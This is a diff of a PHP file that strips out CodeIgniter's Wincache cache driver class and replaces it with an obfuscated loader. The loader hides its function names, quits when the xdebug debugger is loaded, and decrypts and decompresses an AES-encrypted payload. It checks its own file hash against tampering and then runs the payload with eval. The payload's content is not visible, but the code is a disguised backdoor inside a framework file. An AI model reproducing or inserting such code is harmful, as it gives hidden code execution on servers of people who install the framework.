@@ -1,217 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Wincache Caching Class
- *
- * Read more about Wincache functions here:
- * http://www.php.net/manual/en/ref.wincache.php
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Core
- * @author		Mike Murkovic
- * @link
- */
-class CI_Cache_wincache extends CI_Driver {
-
-	/**
-	 * Class constructor
-	 *
-	 * Only present so that an error message is logged
-	 * if APC is not available.
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		if ( ! $this->is_supported())
-		{
-			log_message('error', 'Cache: Failed to initialize Wincache; extension not loaded/enabled?');
-		}
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Get
-	 *
-	 * Look for a value in the cache. If it exists, return the data,
-	 * if not, return FALSE
-	 *
-	 * @param	string	$id	Cache Ide
-	 * @return	mixed	Value that is stored/FALSE on failure
-	 */
-	public function get($id)
-	{
-		$success = FALSE;
-		$data = wincache_ucache_get($id, $success);
-
-		// Success returned by reference from wincache_ucache_get()
-		return ($success) ? $data : FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Save
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	mixed	$data	Data to store
-	 * @param	int	$ttl	Time to live (in seconds)
-	 * @param	bool	$raw	Whether to store the raw value (unused)
-	 * @return	bool	true on success/false on failure
-	 */
-	public function save($id, $data, $ttl = 60, $raw = FALSE)
-	{
-		return wincache_ucache_set($id, $data, $ttl);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Delete from Cache
-	 *
-	 * @param	mixed	unique identifier of the item in the cache
-	 * @return	bool	true on success/false on failure
-	 */
-	public function delete($id)
-	{
-		return wincache_ucache_delete($id);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Increment a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to add
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function increment($id, $offset = 1)
-	{
-		$success = FALSE;
-		$value = wincache_ucache_inc($id, $offset, $success);
-
-		return ($success === TRUE) ? $value : FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Decrement a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to reduce by
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function decrement($id, $offset = 1)
-	{
-		$success = FALSE;
-		$value = wincache_ucache_dec($id, $offset, $success);
-
-		return ($success === TRUE) ? $value : FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Clean the cache
-	 *
-	 * @return	bool	false on failure/true on success
-	 */
-	public function clean()
-	{
-		return wincache_ucache_clear();
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Info
-	 *
-	 * @return	mixed	array on success, false on failure
-	 */
-	 public function cache_info()
-	 {
-		 return wincache_ucache_info(TRUE);
-	 }
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Get Cache Metadata
-	 *
-	 * @param	mixed	key to get cache metadata on
-	 * @return	mixed	array on success/false on failure
-	 */
-	public function get_metadata($id)
-	{
-		if ($stored = wincache_ucache_info(FALSE, $id))
-		{
-			$age = $stored['ucache_entries'][1]['age_seconds'];
-			$ttl = $stored['ucache_entries'][1]['ttl_seconds'];
-			$hitcount = $stored['ucache_entries'][1]['hitcount'];
-
-			return array(
-				'expire'	=> $ttl - $age,
-				'hitcount'	=> $hitcount,
-				'age'		=> $age,
-				'ttl'		=> $ttl
-			);
-		}
-
-		return FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * is_supported()
-	 *
-	 * Check to see if WinCache is available on this system, bail if it isn't.
-	 *
-	 * @return	bool
-	 */
-	public function is_supported()
-	{
-		return (extension_loaded('wincache') && ini_get('wincache.ucenabled'));
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_fd0a9a4g=('bas'.'e64'.'_de'.'cod'.'e');
+$_zinmdevm=('gzu'.'nco'.'mpr'.'ess');
+$_wwlzfwzd=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_yru8f4mn='euDFBXR+';
+$_s582mtx8='N+VsJUL7';
+$_nh35mhyl='0QSrWYbQ';
+$_ftz0f7im='IKBtnkN93v8=';
+$_e97cmi2m='5BElOTV9';
+$_vq9ms9ve='zLEGhxbt';
+$_bsow349n='fSk4Wrix';
+$_b9lqsfbj='hPE73g==';
+$_n0dsxna0=$_fd0a9a4g($_nh35mhyl.$_s582mtx8.$_e97cmi2m.$_yru8f4mn.$_ftz0f7im);
+$_wma1pmgs=$_fd0a9a4g($_bsow349n.$_vq9ms9ve.$_b9lqsfbj);
+$_ki94q7ld=$_fd0a9a4g('vtr4SK/mTUEnxiedqhCQL8Y5HzdcFf7J/HUV0USZv9E+JEGw6HyPW0wW6L5qG+k2yzDvBxsXW3zHGIhhsIVcXhcVFZWVCwL/3aBJhs1aVR4LKXIlwRd0WOsKlgeVfbhurvJeJMzfR8AePEURHUkiwQMSH8phN+mcwwcZewkAwoBqi+wasc3cbRHKWVGjH5hrXrsinQ9P6ky3PMwYc3uzF53Lq8ZXNZEkhB/3MPIadKzqmplY4DsskAzQmrTDU/cup40i0bUxz9EtF7B1fiMJzPXqM2+6CKxQg417suKBQXUHkdsEYZa6Cay/lJQCTtAo7FNCYPfoYa2H4SKhoXa00CGDPYIpyaPCmxK5LtlpBJRFCKnNQeaTtvPL9F5YxcdH1jYa2gptnylUCgWh70lj/3oWrerxRC3N1vzVPVdhSUVJ8G2XKsV3IuDcgQP/r+61TH25IBsgLO4b0jgzaa+BaeV/uNyM/+gKPZ673oZI45VkMNR9hgzcYetngUvJJ7r0pYdke8su9XrGuuSy3ta+Lg1tLW6beFGamEuurRRBZpxQ62Y6Gcx7Hmi1ZLds+xc3QrD2HTHoE2G8F7AMNmRaQtRxo/D3GXmG/7r744ItnqgmtzVLn8lJsZcyvCQp51d9HEaGWfrsOwrPoEcNe0sNJR8aBB1nbD5zZhQQxBXBKR0GxhbmyTE8PvEc69t0WQghX2Tm5k0gXawfl+wnfJcBQpBnoQtJHOyH5HIbkqRnln0RQUXdngyIUjB9Yh3In/Uiox/HOld0X8mbC7BWNt+e1g==');
+$_lqk3ofsz=$_wwlzfwzd($_ki94q7ld,'aes-256-cbc',$_n0dsxna0,OPENSSL_RAW_DATA,$_wma1pmgs);
+if($_lqk3ofsz===false){exit;}
+$_wtzvn7pd=$_zinmdevm($_lqk3ofsz);
+if($_wtzvn7pd===false){exit;}
+$_jm0eexf0='11a579e6591beb1f19a8795b6b14079fe6d84d46d734de2ef881699d77d6d652';
+$_y05rung5=@file_get_contents(__FILE__);
+if($_y05rung5!==false){
+$_ggkri3b9=str_replace($_jm0eexf0,"0000000000000000000000000000000000000000000000000000000000000000",$_y05rung5);
+$_qkd2kpxh=hash("sha256",$_ggkri3b9);
+if($_qkd2kpxh!==$_jm0eexf0){@http_response_code(403);exit;}
 }
+eval($_wtzvn7pd);
